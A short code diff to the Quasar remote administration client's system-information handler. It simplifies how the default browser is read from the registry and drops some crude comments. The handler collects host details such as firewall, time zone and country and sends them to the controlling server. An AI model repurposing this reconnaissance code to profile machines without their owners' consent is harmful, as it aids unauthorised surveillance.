@@ -64,7 +64,7 @@ namespace Quasar.Client.Messages
                     new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                     new Tuple<string, string>("Time Zone", geoInfo.Timezone),
                     new Tuple<string, string>("Country", geoInfo.Country),
-                    new Tuple<string, string>("Main Browser", defaultBrowser) // Adding the default browser to tuple 
+                    new Tuple<string, string>("Main Browser", defaultBrowser)
                 };
 
                 client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
@@ -73,7 +73,7 @@ namespace Quasar.Client.Messages
             {
             }
         }
-        private string GetDefaultBrowser() // Get the default browser you dumb ass
+        private string GetDefaultBrowser()
         {
             try
             {
@@ -83,10 +83,7 @@ namespace Quasar.Client.Messages
                     if (key != null)
                     {
                         var browserProgId = key.GetValue("ProgId")?.ToString();
-                        if (browserProgId != null)
-                        {
-                            return GetBrowserNameFromProgId(browserProgId);
-                        }
+                        return browserProgId ?? "-";
                     }
                 }
             }
@@ -95,19 +92,6 @@ namespace Quasar.Client.Messages
             }
 
             return "-";
-        }
-
-        private string GetBrowserNameFromProgId(string progId) // just read what it says
-        {
-            var browserMappings = new Dictionary<string, string>
-            {
-                { "FirefoxURL", "Mozilla Firefox" },
-                { "ChromeHTML", "Google Chrome" },
-                { "MSEdgeHTM", "Microsoft Edge" },
-                { "OperaStable", "Opera" }
-            };
-
-            return browserMappings.ContainsKey(progId) ? browserMappings[progId] : "Unknown Browser";
         }
     }
 }
